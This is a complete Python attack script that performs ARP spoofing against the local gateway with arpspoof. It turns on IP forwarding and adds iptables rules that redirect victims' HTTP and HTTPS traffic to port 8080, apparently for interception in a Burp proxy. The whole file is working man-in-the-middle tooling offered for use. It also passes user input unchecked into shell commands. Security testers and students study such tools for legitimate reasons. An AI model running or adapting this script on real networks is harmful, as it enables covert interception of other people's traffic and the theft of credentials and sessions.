#!/usr/bin/python3

# @yayip_

from optparse import OptionParser
import os, sys, subprocess

usage = sys.argv[0] + " -i [iface] "
parser = OptionParser(usage)
parser.add_option("-i","--iface",
                  dest="iface", default=True, metavar="iface", help="MITM Interface")
(options, args) = parser.parse_args()

def add_rules():
	# sys forwarding
	subprocess.Popen("sysctl net.ipv4.ip_forward=1", stdout=subprocess.DEVNULL, shell=True)
	# firewall redirection to burp
	os.system("sudo iptables -A FORWARD --in-interface " + options.iface + " -j ACCEPT")
	os.system("sudo iptables -t nat -A PREROUTING -i " + options.iface + " -p tcp -m multiport --dport 80,443 -j REDIRECT --to-port 8080")

def remove_rules():
	os.system("sudo iptables -D FORWARD --in-interface " + options.iface + " -j ACCEPT")
	os.system("sudo iptables -D PREROUTING -t nat -i " + options.iface + " -p tcp -m multiport --dport 80,443 -j REDIRECT --to-port 8080")

def get_gateway():
	try: 
		import netifaces
	except:	
		os.system("pip install netifaces")	
	gws = netifaces.gateways()['default'][netifaces.AF_INET]
	if gws[1] == options.iface:
		return gws[0]
	else:
		print ("Gateway not Found !")
		exit()

def mitm_process(gateway):
	arpspoof = subprocess.call(["which", "arpspoof"], stdout=subprocess.DEVNULL)
	if arpspoof != 0:
	    print("arpspoof not installed!")
	    os.system("apt install dsniff")
	cmd = ("arpspoof -i " + options.iface + " " + gateway)
	subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)

try:
	if __name__ == '__main__':
		if options.iface != True:
			mitm_process(get_gateway())
			add_rules()
			print ("CTRL +C to Exit")
			while True:
				pass
		else:
			print (sys.argv[0] + " -i [iface]")
except KeyboardInterrupt:
	remove_rules()
	exit()
